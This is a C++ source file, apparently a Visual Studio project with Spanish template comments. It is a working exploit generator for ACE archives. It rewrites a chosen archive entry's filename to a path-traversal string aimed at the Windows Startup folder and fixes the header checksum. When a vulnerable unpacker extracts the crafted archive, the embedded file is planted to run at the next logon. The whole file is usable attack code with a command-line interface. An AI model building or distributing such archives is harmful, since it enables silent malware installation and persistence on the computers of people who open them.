// AceExploit.cpp : Este archivo contiene la función "main". La ejecución del programa comienza y termina ahí.
//

#include <iostream>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#define MAGICSTRING "C:\\C:C:../AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
char AceFileName[256];
char ExploitFileName[256];
char OutputFile[256];
#pragma pack(1)
struct ACESTR {
	short length=0;
	char* buff;
};
#pragma pack(1) 
struct AceBlockFile {
	int packsize;
	int originalsize;
	short ctime;
	short cdate;
	int attrib;
	int crc32;
	char comptbyte;
	char compquality;
	short params;
	short reserved;
	ACESTR acestr;
};
#pragma pack(1) 
struct AceHeader {
	short crc;
	short size;
	char type;
	short flags;
	AceBlockFile aceBlockFile= { 0 };
};


uint32_t crc32(const char* s, size_t n) {
	uint32_t crc = 0xFFFFFFFF;

	for (size_t i = 0; i < n; i++) {
		char ch = s[i];
		for (size_t j = 0; j < 8; j++) {
			uint32_t b = (ch ^ crc) & 1;
			crc >>= 1;
			if (b) crc = crc ^ 0xEDB88320;
			ch >>= 1;
		}
	}

	return ~crc;
}


int commandParse(int argc, char* argv[]) {
	if (argc < 4) {
		printf("How to use: AceExploit AceFileName ExploitFileName (inside the ace) outputfile");
		return 1;
	}
	strncpy_s(AceFileName, argv[1],256);
	strncpy_s(ExploitFileName, argv[2],256);
	strncpy_s(OutputFile, argv[3], 256);
	return 0;
}

int main(int argc, char* argv[])
{
	int ret = commandParse(argc, argv);
	if (ret) return 1;
	FILE* f;
	FILE* o;
	ret = fopen_s(&f,AceFileName, "rb");
	if (ret || f == NULL) {
		printf("File does not exist");
		return 1;
	}
	ret = fopen_s(&o, OutputFile, "w+b");
	if (ret || o == NULL) {
		printf("Unable to create exit file");
		return 1;
	}
	char tmpbuff[256];
	AceHeader header;
	size_t readedBytes = fread(&header, 7, 1, f);
	if (!readedBytes) {
		printf("Error reading file");
		return 1;
	}
	fwrite(&header, 7, 1, o);
	readedBytes = fread(tmpbuff, header.size - 3, 1, f);
	if (!readedBytes) {
		printf("Error reading file");
		return 1;
	}
	fwrite(tmpbuff, header.size-3, 1, o);
	int position;
	while (true) {
		position = ftell(f);
		readedBytes = fread(&header, 7, 1, f);
		if (!readedBytes) {
			printf("Error reading file or ExploitFileName not found");
			return 1;
		}
		if (header.type == 0x01) {
			readedBytes = fread(&header.aceBlockFile, sizeof(AceBlockFile)-sizeof(ACESTR), 1, f);
			if (!readedBytes) {
				printf("Error reading file or ExploitFileName not found");
				return 1;
			}
			readedBytes = fread(&(header.aceBlockFile.acestr.length), sizeof(header.aceBlockFile.acestr.length), 1, f);
			if (!readedBytes) {
				printf("Error reading file or ExploitFileName not found");
				return 1;
			}
			header.aceBlockFile.acestr.buff = (char*)malloc(header.aceBlockFile.acestr.length+1);
			if (header.aceBlockFile.acestr.buff == NULL) {
				printf("Malloc error");
				return 1;
			}
			readedBytes = fread(header.aceBlockFile.acestr.buff, header.aceBlockFile.acestr.length, 1, f);
			if (!readedBytes) {
				printf("Error reading file or ExploitFileName not found");
				return 1;
			}
			header.aceBlockFile.acestr.buff[header.aceBlockFile.acestr.length] = '\0';
			if (strstr((header.aceBlockFile.acestr.buff), ExploitFileName))
				break;
		}
		fwrite(&header, sizeof(header)-4, 1, o);
		fwrite(header.aceBlockFile.acestr.buff, header.aceBlockFile.acestr.length, 1, o);
		char* content = (char*)malloc(header.aceBlockFile.packsize); //If the file is too big would lead to too much memory consumption should be changed for something like buff[512] and keep readding on it until packsize reached but i'm too lazy because it works now basically
		fread(content, header.aceBlockFile.packsize, 1, f);
		fwrite(content, header.aceBlockFile.packsize, 1, o);
		free(header.aceBlockFile.acestr.buff);
		free(content);
	}

	header.aceBlockFile.acestr.buff = (char*)malloc(sizeof(MAGICSTRING) + sizeof(ExploitFileName));
	memcpy(header.aceBlockFile.acestr.buff, MAGICSTRING, sizeof(MAGICSTRING));
	memcpy(header.aceBlockFile.acestr.buff+sizeof(MAGICSTRING)-1,ExploitFileName ,strlen(ExploitFileName));
	unsigned short oldlength = header.aceBlockFile.acestr.length;
	header.aceBlockFile.acestr.length = strlen(MAGICSTRING) + strlen(ExploitFileName);
	header.size = header.size + (header.aceBlockFile.acestr.length - oldlength);


	int crcposition = ftell(o);
	fwrite(&header, sizeof(header) - 4, 1, o);
	fwrite(header.aceBlockFile.acestr.buff, header.aceBlockFile.acestr.length, 1, o);
	char* content = (char*)malloc(header.aceBlockFile.packsize);
	fread(content, header.aceBlockFile.packsize, 1, f);
	fwrite(content, header.aceBlockFile.packsize, 1, o);
	fseek(o, crcposition+4,SEEK_SET);
	char* crcbuffer = (char*)malloc(header.size);
	readedBytes = fread(crcbuffer, header.size, 1, o);
	unsigned int crc32value = crc32(crcbuffer, header.size);
	crc32value=0xffff&crc32value^0xffff;
	fseek(o, crcposition, SEEK_SET);
	fwrite(&crc32value, sizeof(short), 1, o);
	fseek(o, 2+header.size+header.aceBlockFile.packsize, SEEK_CUR);

	free(header.aceBlockFile.acestr.buff);
	free(content);
	free(crcbuffer);


	while (readedBytes = fread(tmpbuff, 1, sizeof(tmpbuff), f))
		fwrite(tmpbuff, readedBytes, 1, o);
	fclose(f);
	fclose(o);



	return 0;

}

// Ejecutar programa: Ctrl + F5 o menú Depurar > Iniciar sin depurar
// Depurar programa: F5 o menú Depurar > Iniciar depuración

// Sugerencias para primeros pasos: 1. Use la ventana del Explorador de soluciones para agregar y administrar archivos
//   2. Use la ventana de Team Explorer para conectar con el control de código fuente
//   3. Use la ventana de salida para ver la salida de compilación y otros mensajes
//   4. Use la ventana Lista de errores para ver los errores
//   5. Vaya a Proyecto > Agregar nuevo elemento para crear nuevos archivos de código, o a Proyecto > Agregar elemento existente para agregar archivos de código existentes al proyecto
//   6. En el futuro, para volver a abrir este proyecto, vaya a Archivo > Abrir > Proyecto y seleccione el archivo .sln
